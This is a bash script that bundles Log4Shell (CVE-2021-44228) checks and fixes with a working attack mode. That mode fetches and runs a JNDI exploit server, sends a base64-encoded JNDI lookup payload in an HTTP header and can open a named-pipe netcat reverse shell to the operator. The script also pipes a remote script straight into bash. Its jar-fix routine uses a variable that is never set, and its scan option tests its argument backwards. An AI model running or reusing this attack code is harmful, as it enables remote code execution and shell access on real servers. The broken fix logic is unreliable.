#!/bin/bash

# Log4j multitool-script - CVE-2021-44228
#
# Software list: https://github.com/cisagov/log4j-affected-db
#
# PoC _ https://github.com/christophetd/log4shell-vulnerable-app
#
# log4j2.noFormatMsgLookup = true
# JVM -> Log4j update : 2.15 -> 2.16
#
# $0 [options] [command] [exploit-ip-server]

#                                                                                                                              
#_|                            _|  _|              _|                  _|  _|  _|  _|              _|                  _|  _|  
#_|          _|_|      _|_|_|  _|  _|      _|_|_|  _|_|_|      _|_|    _|  _|  _|  _|      _|_|_|  _|_|_|      _|_|    _|  _|  
#_|        _|    _|  _|    _|  _|_|_|_|  _|_|      _|    _|  _|_|_|_|  _|  _|  _|_|_|_|  _|_|      _|    _|  _|_|_|_|  _|  _|  
#_|        _|    _|  _|    _|      _|        _|_|  _|    _|  _|        _|  _|      _|        _|_|  _|    _|  _|        _|  _|  
#_|_|_|_|    _|_|      _|_|_|      _|    _|_|_|    _|    _|    _|_|_|  _|  _|      _|    _|_|_|    _|    _|    _|_|_|  _|  _|  
#                          _|                                                                                                  
#                      _|_|     
#
# > Running Log4shell Framework & Check-Toolkit on shell v0.1a (C) 2021 suuhm


MY_IP=$(ip addr | grep "inet .*scope global" | sed -r 's/.*\ ([0-9].*)\/.*/\1/g')
XPL_IP=$MY_IP

_url_encoder() {

	# UTF-8 - LF
	echo $1 | sed -e 's/%/%25/g' -e 's/ /%20/g' -e 's/!/%21/g' -e 's/"/%22/g' -e 's/#/%23/g' \
						-e 's/\$/%24/g' -e 's/\&/%26/g' -e 's/'\''/%27/g' -e 's/(/%28/g' -e 's/)/%29/g' \
						-e 's/\*/%2a/g' -e 's/+/%2b/g' -e 's/,/%2c/g' -e 's/-/%2d/g' -e 's/\./%2e/g' \
						-e 's/\//%2f/g' -e 's/:/%3a/g' -e 's/;/%3b/g' -e 's//%3e/g' -e 's/?/%3f/g' \
						-e 's/@/%40/g' -e 's/\[/%5b/g' -e 's/\\/%5c/g' -e 's/\]/%5d/g' -e 's/\^/%5e/g' \
						-e 's/_/%5f/g' -e 's/`/%60/g' -e 's/{/%7b/g' -e 's/|/%7c/g' -e 's/}/%7d/g' -e 's/~/%7e/g'
	return 0
}

_run_xploit_server() {

	if [ ! -f JNDIExploit.v1.2.zip ]; then
		echo -e "\nDownloading Exploit Server...\n"
		# Here you need the JNDIExploit or some other LDAP server: archive.org for
		ARCH_URL="https://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream"
		curl -#SL "$ARCH_URL" -o JNDIExploit.v1.2.zip && unzip JNDIExploit.v1.2.zip
	fi
	
	sleep 2
	echo -e "\nRunning LDAP server on $XPL_IP:8888 -> LDAP:1389\n"
	java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $XPL_IP -p 8888
}

_set_windows() {

	echo "Search and put in CSV"
	echo "Get-childitem -Path C:\ -Include log4j*.jar -File -Recurse -ErrorAction SilentlyContinue | select Lastwritetime, directory, name | export-csv -append -notypeinformation found_log4j_files.csv"
	sleep 3

	echo "Fix on Windows:"
	# Variable name:LOG4J_FORMAT_MSG_NO_LOOKUPS
	# Variable value: true

	# Powershell command to set the variable:
	echo "[System.Environment]::SetEnvironmentVariable('LOG4J_FORMAT_MSG_NO_LOOKUPS','true',[System.EnvironmentVariableTarget]::Machine)"
}

_check_lnx() {

	echo "Searching for log4j files:"

	find / -name "*log4j*" 2>&1 \
	| grep -v '^find:.* Permission denied$' \
    	| grep -v '^find:.* No such file or directory$'

    	echo -e "\n\nGet installed log4j Packages:"  
    	sh -c 'dpkg -l | grep -E "*log4j"' 2> /dev/null
    	sh -c 'rpm -qpl *.rpm | grep -E "*log4j"' 2> /dev/null

    	sleep 2
	echo -e "\nMore intense check? Extern check on: https://github.com/rubo77/log4j_checker_beta"
	echo -n "Input: (y/n): " ; read -r yn

	if [ "$yn" == "y" ]; then
		echo "Check now.."
		# Credits to: https://github.com/rubo77/log4j_checker_beta
		wget https://raw.githubusercontent.com/rubo77/log4j_checker_beta/main/log4j_checker_beta.sh -q -O - |bash
		exit 0;
	else
		echo "Exit now."
		exit 0;
	fi
}

_fix_lnx() {

	echo "This fix will delete Class from: "
	find /var /etc /usr /opt /lib* -name "*log4j-core-*" 2>&1 \
	| grep -v '^find:.* Permission denied$' \
    	| grep -v '^find:.* No such file or directory$'

    	echo
    	echo -n "Enter full path to the jar file and press Enter: " ; read -r yn
    	# /$(dirname $JARF)/$(basename $JARF)-backup
    	cp -a $JARF $JARF"-backup"
	zip -q -d $JARF org/apache/logging/log4j/core/lookup/JndiLookup.class

	echo -e "\nDone!" 
}

_run_dummy_server() {

	echo "Running PoC - Springboot / Tomcat server:"
	echo
	echo "watch content with : docker exec vulnerable-app ls /tmp"
	echo
	sleep 2
	docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app

	# BUILD SELF
	# docker build . -t vulnerable-app
	# docker run -p 8080:8080 --name vulnerable-app vulnerable-app

	# ssh $XPL_IP -p 22 "wget $ARCH_URL && unzip JNDIExploit.v1.2.zip && java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $XPL_IP -p 8888"
	_run_xploit_server
}

_run_attack() {

	_run_xploit_server
	sleep 2
	
	if [[ "$2" =~ ^-[a-z] ]]; then
		VIC_IP_PRT=127.0.0.1:8080
		C3=$2
		#shift 1
	else
		VIC_IP_PRT=$2
		C3=$3
	fi
		
	if [[ "$C3" =~ ^-e ]]; then
		echo "Starting reverse netcat proxy-shell..."
		# nc -e issnt working in maintain versions :()

		#Listen & run on other term/host
		nohup nc -nvlp 4244 &

		# Reverse Prixy Shell - NC version
		# rm -f /tmp/bp;mknod /tmp/bp p && cat /tmp/bp | /bin/sh -i 2>&1 | nc $MY_IP 4244 >/tmp/bp
		C="rm -f /tmp/bp;mknod /tmp/bp p && /bin/sh 0</tmp/bp | nc $MY_IP 4244 1>/tmp/bp"
	elif [[ "$C3" =~ ^-t ]]; then
		C="touch /root/helloroot"
	else
		C=$C3
	fi

	# echo "dG91Y2ggL3RtcC9wd25lZAo=" | base64 -d
	# base64 -d - <<< "dG91Y2ggL3RtcC9wd25lZAo="
	B64C=$(echo $C | base64 -w0)
	B64S=$(_url_encoder $B64C)

	echo -e "\nConnection to $VIC_IP_PRT"
	curl $VIC_IP_PRT -H 'X-Api-Version: ${jndi:ldap://$XPL_IP:1389/Basic/Command/Base64/$B64S}'
	
	if [ -z $RSH ]; then
		echo "Foreground Reverse Shell..."
		sleep 3 && fg 1
	fi
}

_get_python_scan() {
	# https://github.com/fullhunt/log4j-scan
	# see more for WAF bypass and listscans etc.

	if [ ! -z $2 ]; then
		_COM="-u http://127.0.0.1:80 --run-all-tests"
	else
		_COM=$2
	fi
	
	if [ ! -d log4j-scan ]; then
		git clone https://github.com/fullhunt/log4j-scan
		cd log4j-scan && pip3 install -r requirements.txt
		echo "Installation finished"
	fi
	
	echo -e "\nRUNNING:\n"
	sleep 2
	python3 log4j-scan.py $_COM
}


# MAIN()
echo -e "         															"                                                                                                                     
echo -e "_|                            _|  _|              _|                  _|  _|  _|  _|              _|                  _|  _|	"  
echo -e "_|          _|_|      _|_|_|  _|  _|      _|_|_|  _|_|_|      _|_|    _|  _|  _|  _|      _|_|_|  _|_|_|      _|_|    _|  _|  	"	
echo -e "_|        _|    _|  _|    _|  _|_|_|_|  _|_|      _|    _|  _|_|_|_|  _|  _|  _|_|_|_|  _|_|      _|    _|  _|_|_|_|  _|  _|  	"
echo -e "_|        _|    _|  _|    _|      _|        _|_|  _|    _|  _|        _|  _|      _|        _|_|  _|    _|  _|        _|  _|  	"
echo -e "_|_|_|_|    _|_|      _|_|_|      _|    _|_|_|    _|    _|    _|_|_|  _|  _|      _|    _|_|_|    _|    _|    _|_|_|  _|  _|  	"
echo -e "                          _|                                                                                                  	"
echo -e "                      _|_|                                                                                                    	"

echo -e "\n > Running Log4shell Framework & Check-Toolkit on shell v0.1a (C) 2021 suuhm							"
echo

if [ "$1" == "--get-powershell-finder" ]; then
	_set_windows 
	exit 0
elif [ "$1" == "--check-system" ]; then
	_check_lnx
	exit 0
elif [ "$1" == "--fix-log4j" ]; then
	_fix_lnx
	exit 0
elif [ "$1" == "--run-dummy-server" ]; then
	_run_dummy_server
	exit 0
elif [ "$1" == "--run-attack" ]; then
	if [ $3 ]; then 
		_run_attack $1 $2 $3
	elif [ $2 ]; then
		_run_attack $1 $2
	else
		_run_attack $1
	fi
	exit 0
elif [ "$1" == "--python-scan" ]; then
	_get_python_scan $2
	exit 0
else
	echo "Wrong input! Please enter one of these options:"
	echo
	echo "Usage: $0 [OPTIONS] <IP:PORT|COMMAND>"
	echo
	echo "			--get-powershell-finder"
	echo "			--check-system"
	echo "			--fix-log4j"
	echo "			--run-dummy-server <JNDIExploit.*.zip>"
	echo "			--run-attack <FORMAT: IP:PORT> <-e/-t>"
	echo "			--python-scan <command>"
	echo
	exit 1;
fi
